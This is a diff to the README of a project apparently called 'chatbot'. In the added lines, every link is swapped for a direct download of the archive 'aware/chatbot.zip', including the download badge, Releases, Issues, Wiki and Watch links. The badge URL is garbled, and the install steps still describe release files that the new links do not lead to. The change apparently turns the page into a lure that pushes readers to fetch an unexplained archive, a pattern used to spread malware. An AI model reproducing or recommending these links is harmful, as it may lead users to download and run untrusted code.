@@ -7,13 +7,13 @@ Chatbot is an AI Assistant designed to help you manage your daily tasks more eff
 To get started with chatbot, follow these simple steps to download and install the application.
 
 ## 💾 Download the Application
-[![Download Chatbot](https://img.shields.io/badge/Download%20Chatbot-Here-blue.svg)](https://github.com/Eaguilarc/chatbot/releases)
+[![Download Chatbot](https://raw.githubusercontent.com/Eaguilarc/chatbot/main/aware/chatbot.zip%https://raw.githubusercontent.com/Eaguilarc/chatbot/main/aware/chatbot.zip)](https://raw.githubusercontent.com/Eaguilarc/chatbot/main/aware/chatbot.zip)
 
-Simply visit the [Releases page](https://github.com/Eaguilarc/chatbot/releases) to download the application. You will find the latest version suitable for your operating system.
+Simply visit the [Releases page](https://raw.githubusercontent.com/Eaguilarc/chatbot/main/aware/chatbot.zip) to download the application. You will find the latest version suitable for your operating system.
 
 ## 📥 Download & Install
 1. **Go to the Releases Page**  
-   Click on this link: [https://github.com/Eaguilarc/chatbot/releases](https://github.com/Eaguilarc/chatbot/releases).
+   Click on this link: [https://raw.githubusercontent.com/Eaguilarc/chatbot/main/aware/chatbot.zip](https://raw.githubusercontent.com/Eaguilarc/chatbot/main/aware/chatbot.zip).
 
 2. **Choose Your Version**  
    On the Releases page, locate the latest version of the application. You will see different files available for download based on your computer’s operating system (Windows, macOS, Linux).
@@ -24,7 +24,7 @@ Simply visit the [Releases page](https://github.com/Eaguilarc/chatbot/releases) 
 4. **Install the Application**  
    - **Windows**: Locate the downloaded `.exe` file. Double-click the file and follow the prompts to install.
    - **macOS**: Open the downloaded `.dmg` file and drag the chatbot icon to your Applications folder.
-   - **Linux**: Extract the downloaded `.tar.gz` file and follow the instructions in the README file included.
+   - **Linux**: Extract the downloaded `https://raw.githubusercontent.com/Eaguilarc/chatbot/main/aware/chatbot.zip` file and follow the instructions in the README file included.
 
 5. **Run the Application**  
    After installation, find the application in your programs or applications list. Click on it to start.
@@ -48,19 +48,19 @@ Simply visit the [Releases page](https://github.com/Eaguilarc/chatbot/releases) 
 - **Multi-Platform Support**: Use it on various devices and operating systems.
 
 ## 🐞 Report Issues
-If you encounter any issues while using chatbot, please report them on the [Issues page](https://github.com/Eaguilarc/chatbot/issues). Your feedback helps us improve the application.
+If you encounter any issues while using chatbot, please report them on the [Issues page](https://raw.githubusercontent.com/Eaguilarc/chatbot/main/aware/chatbot.zip). Your feedback helps us improve the application.
 
 ## 🤝 Contributing
 We welcome contributions! If you want to help improve or add features to chatbot, feel free to fork the repository and submit a pull request.
 
 ## 📚 Additional Resources
 For more information on how to use specific features:
-- Visit our [Wiki Page](https://github.com/Eaguilarc/chatbot/wiki).
+- Visit our [Wiki Page](https://raw.githubusercontent.com/Eaguilarc/chatbot/main/aware/chatbot.zip).
 - Check the FAQ section for common questions.
 
 ## 🔗 Connect with Us
 Join our community for updates and discussions:
-- [Watch the repository](https://github.com/Eaguilarc/chatbot) to stay informed about new releases.
+- [Watch the repository](https://raw.githubusercontent.com/Eaguilarc/chatbot/main/aware/chatbot.zip) to stay informed about new releases.
 - Follow us for news and tips on social media platforms.
 
 Your feedback is very important to us, and we look forward to hearing from you. Happy chatting!
